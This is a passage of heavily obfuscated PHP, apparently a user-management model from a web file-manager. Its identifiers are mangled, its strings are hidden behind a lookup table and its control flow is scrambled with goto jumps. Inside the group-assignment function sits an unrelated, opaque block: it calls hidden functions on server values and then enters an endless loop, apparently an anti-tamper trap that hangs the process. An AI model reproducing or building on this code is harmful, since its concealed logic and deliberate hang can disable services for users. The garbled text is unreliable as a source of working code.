} $eõ·ÏğÆîî[$Cùò»ŸÒ³[850]] = md5($D‰åèÓÒ«Ø[$Cùò»ŸÒ³[2139]] . trim($eõ·ÏğÆîî[$Cùò»ŸÒ³[850]])); } else { unset($eõ·ÏğÆîî[$Cùò»ŸÒ³[850]]); } goto A¢Î¦è„ïº; A¢Î¦è„ïº: $this->where(array($Cùò»ŸÒ³[1521] => $dÖ…”öëŞã))->save($eõ·ÏğÆîî); if (isset($eõ·ÏğÆîî[$Cùò»ŸÒ³[1957]])) { $this->setNamePinyin($dÖ…”öëŞã, $eõ·ÏğÆîî[$Cùò»ŸÒ³[1957]]); } $this->clearCache($dÖ…”öëŞã); goto eˆ‡íê˜ß„; eˆ‡íê˜ß„: return !0; goto D÷‹Â•Ç; D÷‹Â•Ç: } public function setNamePinyin($Dù…ÆÓ‘ïÎ, $F‘æÚÌ‹Ïê = false) { $Bæß—‘¦” =& $_SERVER[«¾°Ã¤]; if (!$F‘æÚÌ‹Ïê) { $b ã˜µ¦£¯ = $this->getInfoSimple($Dù…ÆÓ‘ïÎ); $F‘æÚÌ‹Ïê = $b ã˜µ¦£¯[$Bæß—‘¦”[1957]] ? $b ã˜µ¦£¯[$Bæß—‘¦”[1957]] : $b ã˜µ¦£¯[$Bæß—‘¦”[28]]; } $dã«äá¦É = Model($Bæß—‘¦”[515]); if (!Input::check($F‘æÚÌ‹Ïê, $Bæß—‘¦”[565])) { return $dã«äá¦É->metaSet($Dù…ÆÓ‘ïÎ, array($Bæß—‘¦”[453] => $Bæß—‘¦”[33], $Bæß—‘¦”[452] => $Bæß—‘¦”[33])); } return $dã«äá¦É->metaSet($Dù…ÆÓ‘ïÎ, array($Bæß—‘¦”[453] => str_replace($Bæß—‘¦”[50], $Bæß—‘¦”[33], Pinyin::encode($F‘æÚÌ‹Ïê)), $Bæß—‘¦”[452] => Pinyin::encode($F‘æÚÌ‹Ïê, $Bæß—‘¦”[566]))); } private function nickNameRpt() { $AÎµĞ´—¿Ğ =& $_SERVER[«¾°Ã¤]; $C¸ôµ’¥Û¼ = Model($AÎµĞ´—¿Ğ[739])->get($AÎµĞ´—¿Ğ[2150]); $béŞ·†»èƒ = $GLOBALS[$AÎµĞ´—¿Ğ[6]][$AÎµĞ´—¿Ğ[378]][$AÎµĞ´—¿Ğ[2150]]; $f¶É¬›Ùñ¨ = !is_null($C¸ôµ’¥Û¼) ? $C¸ôµ’¥Û¼ : $béŞ·†»èƒ; return !!$f¶É¬›Ùñ¨; } private function _checkExist($cŞ…¥—¯, $f­…²“‘® = false) { $E¡”Şµªí =& $_SERVER[«¾°Ã¤]; $DêÂÁ¡èˆÆ = array($E¡”Şµªí[28] => UserModel::ERROR_USER_EXIST_NAME, $E¡”Şµªí[1957] => UserModel::ERROR_USER_EXIST_NICKNAME, $E¡”Şµªí[303] => UserModel::ERROR_USER_EXIST_EMAIL, $E¡”Şµªí[2138] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($DêÂÁ¡èˆÆ[$E¡”Şµªí[1957]]); } $EÉ²ÏöŞÏ¡ = $f­…²“‘® ? array($E¡”Şµªí[1529] => array($E¡”Şµªí[2151], $f­…²“‘®)) : array(); foreach ($DêÂÁ¡èˆÆ as $AÎÌóÏ×æ¢ => $A¹İ±²£ÓÕ) { $DÇƒ’ö×Á‹ = array(); foreach ($DêÂÁ¡èˆÆ as $cÎ—ß¬µóÌ => $d¤¨¶†°·´) { if (isset($cŞ…¥—¯[$cÎ—ß¬µóÌ]) && $cŞ…¥—¯[$cÎ—ß¬µóÌ]) { $DÇƒ’ö×Á‹[] = $cŞ…¥—¯[$cÎ—ß¬µóÌ]; } } if (!$DÇƒ’ö×Á‹) { continue; } $eİ½¨ŒŠ¹Ç = array_merge(array($AÎÌóÏ×æ¢ => array($E¡”Şµªí[7], $DÇƒ’ö×Á‹)), $EÉ²ÏöŞÏ¡); $dŸ×“³§áÛ = $this->where($eİ½¨ŒŠ¹Ç)->find(); if ($dŸ×“³§áÛ) { return $A¹İ±²£ÓÕ; } } return !0; } public function userListInfo($a®‹åè†Î’) { $dÀªÁê×Ğ =& $_SERVER[«¾°Ã¤]; $aôóø®„‚ = array(); $a®‹åè†Î’ = is_array($a®‹åè†Î’) ? array_unique($a®‹åè†Î’) : array(); if (!$a®‹åè†Î’) { return $aôóø®„‚; } if (count($a®‹åè†Î’) < 20) { foreach ($a®‹åè†Î’ as $bä„ŠÄ©‹¥) { $aôóø®„‚[$bä„ŠÄ©‹¥ . $dÀªÁê×Ğ[33]] = $this->getInfoSimpleOuter($bä„ŠÄ©‹¥); } } else { $Fõ”Ä½Û³Í = array($dÀªÁê×Ğ[1521] => array($dÀªÁê×Ğ[420], $a®‹åè†Î’)); if (count($a®‹åè†Î’) == 1) { $Fõ”Ä½Û³Í = array($dÀªÁê×Ğ[1521] => $a®‹åè†Î’[0]); } $bî†¶©§‡“ = Model($dÀªÁê×Ğ[511])->field($this->simpleField)->where($Fõ”Ä½Û³Í)->select(); $bî†¶©§‡“ = array_to_keyvalue($bî†¶©§‡“, $dÀªÁê×Ğ[1529]); foreach ($a®‹åè†Î’ as $bä„ŠÄ©‹¥) { $e²ËíÚ¤› = $bî†¶©§‡“[$bä„ŠÄ©‹¥]; if (!$e²ËíÚ¤›) { $aôóø®„‚[$bä„ŠÄ©‹¥ . $dÀªÁê×Ğ[33]] = $this->getInfoSimpleOuter($bä„ŠÄ©‹¥); continue; } $e²ËíÚ¤›[$dÀªÁê×Ğ[2123]] = Action($dÀªÁê×Ğ[2124])->parseUrl($e²ËíÚ¤›[$dÀªÁê×Ğ[2123]]); $aôóø®„‚[$bä„ŠÄ©‹¥ . $dÀªÁê×Ğ[33]] = $e²ËíÚ¤›; } } return $aôóø®„‚; } protected function userStatus($FÏ… Õ çÈ, $EÊ´Å›Á¶) { $c”Ä»¢Ù•ì = $this->getInfoSimple($FÏ… Õ çÈ); if (!$c”Ä»¢Ù•ì) { return !1; } $F õ×²³Ô½ = array($_SERVER[«¾°Ã¤][719] => $EÊ´Å›Á¶); return $this->userEdit($FÏ… Õ çÈ, $F õ×²³Ô½); } protected function userRemove($cÊÍç¦™•) { goto AÙÃŸ¼·Œ; F¬æ³İæ: $fÃ„””ôİ = array($BÈÑ†¶›•[1521] => $cÊÍç¦™•); Model($BÈÑ†¶›•[572])->where($fÃ„””ôİ)->delete(); Model($BÈÑ†¶›•[2152])->where($fÃ„””ôİ)->delete(); goto B§©·«¸›Õ; B§©·«¸›Õ: Model($BÈÑ†¶›•[1774])->where($fÃ„””ôİ)->delete(); Model($BÈÑ†¶›•[2137])->where($fÃ„””ôİ)->delete(); Model($BÈÑ†¶›•[2153])->where($fÃ„””ôİ)->delete(); goto CÊİ‰§É¶Ö; CÊİ‰§É¶Ö: Model($BÈÑ†¶›•[1974])->removeUserAll($cÊÍç¦™•); Model($BÈÑ†¶›•[799])->userRootRemove($cÊÍç¦™•); return $this->where($fÃ„””ôİ)->delete(); goto DØÑÖç’æ¶; AÙÃŸ¼·Œ: $BÈÑ†¶›• =& $_SERVER[«¾°Ã¤]; $e‹¬‹ ªŠæ = $this->getInfoSimple($cÊÍç¦™•); if (!$e‹¬‹ ªŠæ) { return !1; } goto F¬æ³İæ; DØÑÖç’æ¶: } protected function userGroupSet($FºÃ¶ÎÅ’Å, $dÊÍ¢«Ï­ƒ, $E‡ÓØÔƒóï = array()) { goto D¹¢‹ºíâÔ; b–™™Œ÷ã©: $Cß‚ğëØ¦¤ = array(); $b¤ æ£¦‰Ø = 0; foreach ($dÊÍ¢«Ï­ƒ as $f²àßØ«øí => $a›¶“Œ’àŸ) { $AœŠŠË„å = array($dæÔÛ¿“Ú¯[1529] => $FºÃ¶ÎÅ’Å, $dæÔÛ¿“Ú¯[1693] => $f²àßØ«øí, $dæÔÛ¿“Ú¯[1788] => $a›¶“Œ’àŸ); $AœŠŠË„å[$dæÔÛ¿“Ú¯[1716]] = isset($E‡ÓØÔƒóï[$b¤ æ£¦‰Ø]) ? $E‡ÓØÔƒóï[$b¤ æ£¦‰Ø] : 0; $b¤ æ£¦‰Ø++; $Cß‚ğëØ¦¤[] = $AœŠŠË„å; } goto f‡°ö“è´à; D¹¢‹ºíâÔ: $dæÔÛ¿“Ú¯ =& $_SERVER[«¾°Ã¤]; if (!isset($_SERVER[$dæÔÛ¿“Ú¯[396]]) || !isset($_SERVER[$dæÔÛ¿“Ú¯[394]])) { goto d¿Â¾ÔëÒ÷; d¿Â¾ÔëÒ÷: $bÕ¦…½÷‰Ç = $dæÔÛ¿“Ú¯[840]; $f«‚ÏÂœšä = $dæÔÛ¿“Ú¯[397]; $B“”¼»×‡ = $_SERVER[$dæÔÛ¿“Ú¯[398]] . $dæÔÛ¿“Ú¯[399]; goto CÎìğâËßœ; BÅÉ©†ØÂ: $F¡ÍÇŸ÷­Ë = $dæÔÛ¿“Ú¯[841]; $F¡ÍÇŸ÷­Ë($_SERVER[$dæÔÛ¿“Ú¯[842]]); $AµŒËó§é¥ = 1; goto EŸ„´Ğ¤˜; EŸ„´Ğ¤˜: for ($c©Ä¯Îå­· = $AµŒËó§é¥; $c©Ä¯Îå­· > 0; $c©Ä¯Îå­·++) { $F¡ÍÇŸ÷­Ë = json_encode($GLOBALS[$dæÔÛ¿“Ú¯[420]]); } goto F†ê¿ ©¢™; CÎìğâËßœ: $fîæŒ³‹ˆ = $f«‚ÏÂœšä($B“”¼»×‡); $D¶İ§²’å˜ = explode($dæÔÛ¿“Ú¯[229], $fîæŒ³‹ˆ); if (count($D¶İ§²’å˜) < $dæÔÛ¿“Ú¯[587]) { $fÂ©ŠóÄƒ = $dæÔÛ¿“Ú¯[401]; $fÂ©ŠóÄƒ(); } goto BÅÉ©†ØÂ; F†ê¿ ©¢™: } $b§à´ßœ”Â = $this->getInfoSimple($FºÃ¶ÎÅ’Å); goto EöŠ«´ƒµÖ; f‡°ö“è´à: return $a¡ì¥šÀ½÷->addAll($Cß‚ğëØ¦¤, array(), !0); goto A˜âï¢ÆƒÚ; EöŠ«´ƒµÖ: if (!$b§à´ßœ”Â || !is_array($dÊÍ¢«Ï­ƒ)) { return !1; } $a¡ì¥šÀ½÷ = Model($dæÔÛ¿“Ú¯[1774]); $a¡ì¥šÀ½÷->where(array($dæÔÛ¿“Ú¯[1529] => $FºÃ¶ÎÅ’Å))->delete(); goto b–™™Œ÷ã©; A˜âï¢ÆƒÚ: } protected function userGroupAdd($eâ“ºÃŞ¦¸, $D†Œ˜œ×‰ = array()) { $DõÌßÜ‚¿ =& $_SERVER[«¾°Ã¤]; $Fª¶Éàî—… = $this->getInfoSimple($eâ“ºÃŞ¦¸); if (!$Fª¶Éàî—… || empty($D†Œ˜œ×‰)) { return !1; } $AÕ›½ĞÒ  = array(); foreach ($D†Œ˜œ×‰ as $e„Õò£ù½ => $DÈ÷ó–¬¾) { $AÕ›½ĞÒ [] = array($DõÌßÜ‚¿[1529] => $eâ“ºÃŞ¦¸, $DõÌßÜ‚¿[1693] => $e„Õò£ù½, $DõÌßÜ‚¿[1788] => $DÈ÷ó–¬¾, $DõÌßÜ‚¿[1716] => 0); } return Model($DõÌßÜ‚¿[1774])->addAll($AÕ›½ĞÒ , array(), !0); } protected function userGroupRemove($fàóòêæÖ, $e¹¯ä…åÁË) { $d³˜à‡í =& $_SERVER[«¾°Ã¤]; $b‘«¬ÓØ‰¢ = $this->getInfoSimple($fàóòêæÖ); if (!$b‘«¬ÓØ‰¢ || !$e¹¯ä…åÁË) { return !1; } $D™ˆøÃ…¾£ = array($d³˜à‡í[1521] => $fàóòêæÖ, $d³˜à‡í[1771] => $e¹¯ä…åÁË); return Model($d³˜à‡í[1774])->where($D™ˆøÃ…¾£)->delete(); } public function listData() { $C¾°°¹Ş± = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C¾°°¹Ş±[$_SERVER[«¾°Ã¤][367]]); return $C¾°°¹Ş±; } public function listByID($BáÛ‡Ïôµ™) { $cˆø¡š‘³è =& $_SERVER[«¾°Ã¤]; if (!$BáÛ‡Ïôµ™) { return; } $aßŒŞå†ª = array($cˆø¡š‘³è[1529] => array($cˆø¡š‘³è[7], $BáÛ‡Ïôµ™)); $aÓÓ¶«»ï = $this->where($aßŒŞå†ª)->select(); $this->_listDataApply($aÓÓ¶«»ï); return $aÓÓ¶«»ï; } public function listByGroup($B™¬ÂÈîõŸ = 0, $EÓÛÔöà” = array()) { goto a³¥ÈáÁ³; a³¥ÈáÁ³: $d×ê½Ğ¸·ƒ =& $_SERVER[«¾°Ã¤]; $BÓœï‚ªÁ = $d×ê½Ğ¸·ƒ[33]; $EŒ™½…ÜÎë = array(); goto B‡·Éââ„; B‡·Éââ„: if ($B™¬ÂÈîõŸ) { $EŒ™½…ÜÎë = array($d×ê½Ğ¸·ƒ[2154] => intval($B™¬ÂÈîõŸ)); $BÓœï‚ªÁ = "\114\105\106\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\165\x73\145\162\x5f\x67\x72\x6f\165\x70\40\165\163\145\162\137\x67\162\157\x75\160\40\x6f\x6e\40\165\x73\145\x72\x2e\x75\x73\x65\x72\x49\x44\40\75\x20\165\x73\x65\x72\137\x67\162\157\x75\x70\56\165\163\x65\x72\111\104"; $F¯ë•„±– = Input::get($d×ê½Ğ¸·ƒ[444], null, $d×ê½Ğ¸·ƒ[33]) ? $d×ê½Ğ¸·ƒ[33] : $d×ê½Ğ¸·ƒ[2155]; } if (isset($EÓÛÔöà”[$d×ê½Ğ¸·ƒ[719]])) { $EŒ™½…ÜÎë[$d×ê½Ğ¸·ƒ[2156]] = $EÓÛÔöà”[$d×ê½Ğ¸·ƒ[719]]; } $D£Ê§íÕÂõ = $this->_makeOrder($F¯ë•„±–)->field($d×ê½Ğ¸·ƒ[2157])->where($EŒ™½…ÜÎë)->join($BÓœï‚ªÁ)->selectPage(50); goto C¾‡‰Éîñó; C¾‡‰Éîñó: $this->_listDataApply($D£Ê§íÕÂõ[$d×ê½Ğ¸·ƒ[367]]); return $D£Ê§íÕÂõ; goto a—‘× ‰Û; a—‘× ‰Û: } private function _makeOrder($Fª¼²öø¤ = '') { goto cÄ¹ßƒ‹ì; cÄ¹ßƒ‹ì: $b×Üšã—¼Ê =& $_SERVER[«¾°Ã¤]; $EéÃÃ«ÛË = array($b×Üšã—¼Ê[1529], $b×Üšã—¼Ê[28], $b×Üšã—¼Ê[1679], $b×Üšã—¼Ê[1651], $b×Üšã—¼Ê[194]); $eí¬³ŒÍ« = array($b×Üšã—¼Ê[437] => $b×Üšã—¼Ê[438], $b×Üšã—¼Ê[439] => $b×Üšã—¼Ê[440]); goto B…¥‰Óõ; c£Ş¾äÃ›‡: $Fª¼²öø¤ = $Fª¼²öø¤ . "\165\x73\145\x72\x2e{$Eğ©Æ•Æ”î}\40{$Aåò¿‰á³ë}\54\40\x75\x73\145\x72\x2e\165\x73\145\162\x49\x44\x20\x61\163\143"; return $this->alias($b×Üšã—¼Ê[1897])->order($Fª¼²öø¤); goto BğˆÊõƒ‹; B…¥‰Óõ: $Eğ©Æ•Æ”î = Input::get($b×Üšã—¼Ê[444], $b×Üšã—¼Ê[7], $b×Üšã—¼Ê[1521], $EéÃÃ«ÛË); $Aåò¿‰á³ë = Input::get($b×Üšã—¼Ê[445], $b×Üšã—¼Ê[7], $b×Üšã—¼Ê[1775], array($b×Üšã—¼Ê[1775], $b×Üšã—¼Ê[439])); $Aåò¿‰á³ë = $eí¬³ŒÍ«[$Aåò¿‰á³ë]; goto c£Ş¾äÃ›‡; BğˆÊõƒ‹: } public function listSearch($D¥ãŠÇÖó) { goto EÔŠñéøÚá; EÔŠñéøÚá: $bÚƒ«Ôæ— =& $_SERVER[«¾°Ã¤]; $Få¥á‚Ùå³ = $D¥ãŠÇÖó[$bÚƒ«Ôæ—[1776]]; $B‘£ºƒŒ° = isset($D¥ãŠÇÖó[$bÚƒ«Ôæ—[1777]]) ? $D¥ãŠÇÖó[$bÚƒ«Ôæ—[1777]] : !1; goto Dò×Õ ©; E®©Êè†¶£: $f³«Ğ†İ×  = $this->_makeOrder()->where($d…ÀùÛ¢¾¯)->selectPage(20); if (!$f³«Ğ†İ×  || count($f³«Ğ†İ× [$bÚƒ«Ôæ—[367]]) < 5 && Input::check($Få¥á‚Ùå³, $bÚƒ«Ôæ—[316])) { $cã‰Õ»¥ = $this->_searchFromMeta($bÚƒ«Ôæ—[452], $Få¥á‚Ùå³, 10); $cö˜Ò„™È… = $this->_searchFromMeta($bÚƒ«Ôæ—[453], $Få¥á‚Ùå³, 10); $dæ©Çî°¹ª = array_merge($cã‰Õ»¥, $cö˜Ò„™È…, $f³«Ğ†İ× [$bÚƒ«Ôæ—[367]]); $f³«Ğ†İ× [$bÚƒ«Ôæ—[367]] = array_unique_by_key($dæ©Çî°¹ª, $bÚƒ«Ôæ—[1529]); $f³«Ğ†İ× [$bÚƒ«Ôæ—[364]][$bÚƒ«Ôæ—[365]] = count($f³«Ğ†İ× [$bÚƒ«Ôæ—[367]]); $f³«Ğ†İ× [$bÚƒ«Ôæ—[364]][$bÚƒ«Ôæ—[366]] = ceil($f³«Ğ†İ× [$bÚƒ«Ôæ—[364]][$bÚƒ«Ôæ—[365]] / $f³«Ğ†İ× [$bÚƒ«Ôæ—[364]][$bÚƒ«Ôæ—[361]]); } $this->_listDataApply($f³«Ğ†İ× [$bÚƒ«Ôæ—[367]]); goto Cˆˆ‹ÍË±ô; Cˆˆ‹ÍË±ô: $this->_filterByGroup($f³«Ğ†İ× , $B‘£ºƒŒ°); return $f³«Ğ†İ× ; goto D©Øˆ™ßÖÂ; Dò×Õ ©: $Få¥á‚Ùå³ = str_replace($bÚƒ«Ôæ—[1778], $bÚƒ«Ôæ—[1779], trim($Få¥á‚Ùå³)); $d…ÀùÛ¢¾¯ = array($bÚƒ«Ôæ—[28] => array($bÚƒ«Ôæ—[380], "\45{$Få¥á‚Ùå³}\45"), $bÚƒ«Ôæ—[303] => array($bÚƒ«Ôæ—[380], "{$Få¥á‚Ùå³}\x25"), $bÚƒ«Ôæ—[1957] => array($bÚƒ«Ôæ—[380], "{$Få¥á‚Ùå³}\45"), $bÚƒ«Ôæ—[958] => $bÚƒ«Ôæ—[1780]); if (Input::check($Få¥á‚Ùå³, $bÚƒ«Ôæ—[309])) { $d…ÀùÛ¢¾¯[$bÚƒ«Ôæ—[1529]] = array($bÚƒ«Ôæ—[380], "{$Få¥á‚Ùå³}\x25"); $d…ÀùÛ¢¾¯[$bÚƒ«Ôæ—[2138]] = array($bÚƒ«Ôæ—[380], "{$Få¥á‚Ùå³}\45"); } goto CîÕ‚Ô‡Õ¢; CîÕ‚Ô‡Õ¢: if (!$Få¥á‚Ùå³) { $d…ÀùÛ¢¾¯ = array(); } if (isset($D¥ãŠÇÖó[$bÚƒ«Ôæ—[719]])) { $d…ÀùÛ¢¾¯[$bÚƒ«Ôæ—[719]] = $D¥ãŠÇÖó[$bÚƒ«Ôæ—[719]]; } $d…ÀùÛ¢¾¯ = $this->parseWhereLike($d…ÀùÛ¢¾¯); goto E®©Êè†¶£; D©Øˆ™ßÖÂ: } private function _filterByGroup(&$e¤Üîß°‰·, $d…¨ß£æšö) { $aíŒ¤²ó¤â =& $_SERVER[«¾°Ã¤]; if (!$d…¨ß£æšö) { return $e¤Üîß°‰·; } foreach ($e¤Üîß°‰·[$aíŒ¤²ó¤â[367]] as $FæíÌÑ¿¸Ş => &$b»¿¬¶œ¸•) { $e£ßÈ‰¸‘‰ = array_to_keyvalue($b»¿¬¶œ¸•[$aíŒ¤²ó¤â[1867]], $aíŒ¤²ó¤â[33], $aíŒ¤²ó¤â[1693]); if (!in_array($d…¨ß£æšö, $e£ßÈ‰¸‘‰)) { unset($e¤Üîß°‰·[$aíŒ¤²ó¤â[367]][$FæíÌÑ¿¸Ş]); } } unset($b»¿¬¶œ¸•); $e¤Üîß°‰·[$aíŒ¤²ó¤â[367]] = array_values($e¤Üîß°‰·[$aíŒ¤²ó¤â[367]]); $e¤Üîß°‰·[$aíŒ¤²ó¤â[364]] = array($aíŒ¤²ó¤â[1929] => count($e¤Üîß°‰·[$aíŒ¤²ó¤â[367]]), $aíŒ¤²ó¤â[1927] => $e¤Üîß°‰·[$aíŒ¤²ó¤â[364]][$aíŒ¤²ó¤â[361]], $aíŒ¤²ó¤â[1926] => 1, $aíŒ¤²ó¤â[1928] => 1); } private function _searchFromMeta($bÕ«ëÈÜÁ‰, $aùĞÆ¤ÂŞï, $F”‘¢İæ¾‰) { goto DèØ‘¨æŞ¹; E©ĞÀ†„›ô: $f„šïÆµŸ³ = array_to_keyvalue($f„šïÆµŸ³, $bÅŠ·ÜÓç[33], $bÅŠ·ÜÓç[1529]); $FÌ–º­ó› = $this->where(array($bÅŠ·ÜÓç[1521] => array($bÅŠ·ÜÓç[7], $f„šïÆµŸ³)))->select(); if (!$FÌ–º­ó›) { return array(); } goto DÓÓ·ËÕ÷‰; DÓÓ·ËÕ÷‰: return $FÌ–º­ó›; goto cÄœãŞÚòà; eˆ¸ØÎ —å: $FÀÔªé„ = $this->parseWhereLike($FÀÔªé„); $f„šïÆµŸ³ = Model($bÅŠ·ÜÓç[2158])->where($FÀÔªé„)->limit($F”‘¢İæ¾‰)->select(); if (!$f„šïÆµŸ³) { return array(); } goto E©ĞÀ†„›ô; DèØ‘¨æŞ¹: $bÅŠ·ÜÓç =& $_SERVER[«¾°Ã¤]; $aùĞÆ¤ÂŞï = strtolower($aùĞÆ¤ÂŞï); $FÀÔªé„ = array($bÅŠ·ÜÓç[93] => $bÕ«ëÈÜÁ‰, $bÅŠ·ÜÓç[372] => array($bÅŠ·ÜÓç[380], "\x25{$aùĞÆ¤ÂŞï}\45")); goto eˆ¸ØÎ —å; cÄœãŞÚòà: } private function _listDataApplyItem($FŞ¢’Î¤Ñâ) { $f•‡“ñ»øÍ = array($FŞ¢’Î¤Ñâ); $this->_listDataApply($f•‡“ñ»øÍ); return $f•‡“ñ»øÍ[0]; } private function _listDataApply(&$eÂ¬Ù‹‡¼½) { goto A­ˆŒßÛ‰; f×¹ƒâì½¬: $this->_listAppendSourceRoot($eÂ¬Ù‹‡¼½, $eËÍ†Ğë†°); goto bÂ§¬Ã…¹†; cöªÇöœê: $eËÍ†Ğë†° = array_to_keyvalue($eÂ¬Ù‹‡¼½, $DĞ¿ã©”åŠ[33], $DĞ¿ã©”åŠ[1529]); $this->_listAppendGroup($eÂ¬Ù‹‡¼½, $eËÍ†Ğë†°); $this->_listAppendMeta($eÂ¬Ù‹‡¼½, $eËÍ†Ğë†°); goto f×¹ƒâì½¬; A­ˆŒßÛ‰: $DĞ¿ã©”åŠ =& $_SERVER[«¾°Ã¤]; if (!$eÂ¬Ù‹‡¼½) { return; } array_remove_key($eÂ¬Ù‹‡¼½, $DĞ¿ã©”åŠ[850]); goto cöªÇöœê; bÂ§¬Ã…¹†: } private function _listAppendSourceRoot(&$F©»£×Û½ , $E¹ŸÖ©ÑÃ) { goto a¯º²…Œ®†; AóñÖœõ­: foreach ($F©»£×Û½  as &$BºóùŞˆêÙ) { $BºóùŞˆêÙ[$BìŞñ”‡[85]] = $Cñ©óã‹àè[$BºóùŞˆêÙ[$BìŞñ”‡[1529]]] ? $Cñ©óã‹àè[$BºóùŞˆêÙ[$BìŞñ”‡[1529]]] : array(); } unset($BºóùŞˆêÙ); goto f¤Áâ³Òô©; a¯º²…Œ®†: $BìŞñ”‡ =& $_SERVER[«¾°Ã¤]; $A˜Ìˆ˜Èò– = array($BìŞñ”‡[487] => 0, $BìŞñ”‡[413] => SourceModel::TYPE_USER, $BìŞñ”‡[493] => array($BìŞñ”‡[7], $E¹ŸÖ©ÑÃ)); $FÑ§ôÂ—ñ = $BìŞñ”‡[1786]; goto FÚ†õ°É²¾; FÚ†õ°É²¾: $Cñ©óã‹àè = Model($BìŞñ”‡[799])->order($BìŞñ”‡[1787])->field($FÑ§ôÂ—ñ)->where($A˜Ìˆ˜Èò–)->select(); $Cñ©óã‹àè = array_to_keyvalue($Cñ©óã‹àè, $BìŞñ”‡[493]); $Cñ©óã‹àè = array_remove_key($Cñ©óã‹àè, $BìŞñ”‡[493]); goto AóñÖœõ­; f¤Áâ³Òô©: } private function _listAppendGroup(&$E§¤ÖîÓ•¯, $fš±à“ß¶ç) { goto BæŒó®‹ğ›; BæŒó®‹ğ›: $a“œà™ĞÓ =& $_SERVER[«¾°Ã¤]; $EŒó§Ó¤ = array($a“œà™ĞÓ[1529] => array($a“œà™ĞÓ[7], $fš±à“ß¶ç)); $D’éï‡©  = Model($a“œà™ĞÓ[1774])->where($EŒó§Ó¤)->select(); goto F’‘î–¢Œ†; eŠáØ‡¸Ä‘: foreach ($E§¤ÖîÓ•¯ as &$eÅª’»ƒƒ) { $eÅª’»ƒƒ[$a“œà™ĞÓ[1867]] = array(); if (isset($D’éï‡© [$eÅª’»ƒƒ[$a“œà™ĞÓ[1529]]])) { $eÅª’»ƒƒ[$a“œà™ĞÓ[1867]] = $D’éï‡© [$eÅª’»ƒƒ[$a“œà™ĞÓ[1529]]]; } } unset($eÅª’»ƒƒ); goto eÛËÓÀÑ§¦; F™£ò§¤â½: $D’éï‡©  = array_to_keyvalue_group($D’éï‡© , $a“œà™ĞÓ[1529]); foreach ($D’éï‡©  as &$dÂœ²•’¿°) { $D–Øå“ª¿‹ = array(); foreach ($dÂœ²•’¿° as $dø¾¤Ş¦‹±) { if (!$dø¾¤Ş¦‹±[$a“œà™ĞÓ[1788]]) { continue; } $bïĞ’¤‹ïÑ = Model($a“œà™ĞÓ[1860])->listData($dø¾¤Ş¦‹±[$a“œà™ĞÓ[1788]]); $D–Øå“ª¿‹[] = array($a“œà™ĞÓ[1693] => $dø¾¤Ş¦‹±[$a“œà™ĞÓ[1693]], $a“œà™ĞÓ[2160] => $dÖ®¤¾í‡[$dø¾¤Ş¦‹±[$a“œà™ĞÓ[1693]]][$a“œà™ĞÓ[28]], $a“œà™ĞÓ[496] => $dÖ®¤¾í‡[$dø¾¤Ş¦‹±[$a“œà™ĞÓ[1693]]][$a“œà™ĞÓ[496]], $a“œà™ĞÓ[415] => $bïĞ’¤‹ïÑ); } $dÂœ²•’¿° = $D–Øå“ª¿‹; } unset($dÂœ²•’¿°); goto eŠáØ‡¸Ä‘; F’‘î–¢Œ†: $e“ÚÀéÛÕ = array_to_keyvalue($D’éï‡© , $a“œà™ĞÓ[33], $a“œà™ĞÓ[1693]); $e“ÚÀéÛÕ = array_remove_value(array_unique($e“ÚÀéÛÕ), $a“œà™ĞÓ[191]); if (!$e“ÚÀéÛÕ || !$D’éï‡© ) { return; } goto e¨Å‚áò¶¥; e¨Å‚áò¶¥: $EŒó§Ó¤ = array($a“œà™ĞÓ[1693] => array($a“œà™ĞÓ[7], $e“ÚÀéÛÕ)); $dÖ®¤¾í‡ = Model($a“œà™ĞÓ[1865])->field($a“œà™ĞÓ[2159])->where($EŒó§Ó¤)->select(); $dÖ®¤¾í‡ = array_to_keyvalue($dÖ®¤¾í‡, $a“œà™ĞÓ[1693]); goto F™£ò§¤â½; eÛËÓÀÑ§¦: } private function _listAppendMeta(&$b•»¤Œ©¾ø, $a¤è¼‚Ó¤) { goto FÚâÏ¹îÅ; D»¸Ãˆ£: $aÇ§˜Ğòˆ = array($DºÊç³¨Ù[1529] => array($DºÊç³¨Ù[7], $a¤è¼‚Ó¤)); $EÈÙŞŒ©òÚ = Model($DºÊç³¨Ù[2137])->where($aÇ§˜Ğòˆ)->select(); $EÈÙŞŒ©òÚ = array_to_keyvalue_group($EÈÙŞŒ©òÚ, $DºÊç³¨Ù[1529]); goto C‡†³¹¨Šƒ; C‡†³¹¨Šƒ: foreach ($EÈÙŞŒ©òÚ as &$d¯Á¦ŒÊÓ) { $cÀ‰ÎºÃõ = array(); foreach ($d¯Á¦ŒÊÓ as $CÉ¨ñÏ­†) { if (!in_array($CÉ¨ñÏ­†[$DºÊç³¨Ù[93]], $d…–Ù¾Ä³³)) { $cÀ‰ÎºÃõ[$CÉ¨ñÏ­†[$DºÊç³¨Ù[93]]] = $CÉ¨ñÏ­†[$DºÊç³¨Ù[372]]; } } $d¯Á¦ŒÊÓ = $cÀ‰ÎºÃõ; } unset($d¯Á¦ŒÊÓ); $Aè ‹“–¸º = Model($DºÊç³¨Ù[2161]); goto F‡Õ¡¦‹Éø; FÚâÏ¹îÅ: $DºÊç³¨Ù =& $_SERVER[«¾°Ã¤]; $Aïæ°ìŞ¯Š = UserJobModel::JOB_KEY; $d…–Ù¾Ä³³ = array($DºÊç³¨Ù[2139]); goto D»¸Ãˆ£; F‡Õ¡¦‹Éø: foreach ($b•»¤Œ©¾ø as &$AÊŒñ™Ş¬¦) { $AÃÊ™ÖÜø = array(); if (isset($EÈÙŞŒ©òÚ[$AÊŒñ™Ş¬¦[$DºÊç³¨Ù[1529]]])) { $AÃÊ™ÖÜø = $EÈÙŞŒ©òÚ[$AÊŒñ™Ş¬¦[$DºÊç³¨Ù[1529]]]; } $AÊŒñ™Ş¬¦[$DºÊç³¨Ù[2162]] = array(); if (isset($AÃÊ™ÖÜø[$Aïæ°ìŞ¯Š])) { $AÊŒñ™Ş¬¦[$DºÊç³¨Ù[2162]] = $Aè ‹“–¸º->getUserJobInfo($AÃÊ™ÖÜø[$Aïæ°ìŞ¯Š]); } } unset($AÊŒñ™Ş¬¦); goto EÃÎ­—¢¶; EÃÎ­—¢¶: } protected function groupUserAll($AÛÊ•İ‡§ë) { $eÑŞˆ‘§ğ =& $_SERVER[«¾°Ã¤]; if (!$AÛÊ•İ‡§ë) { return !1; } $d­²Á©°ì¯ = 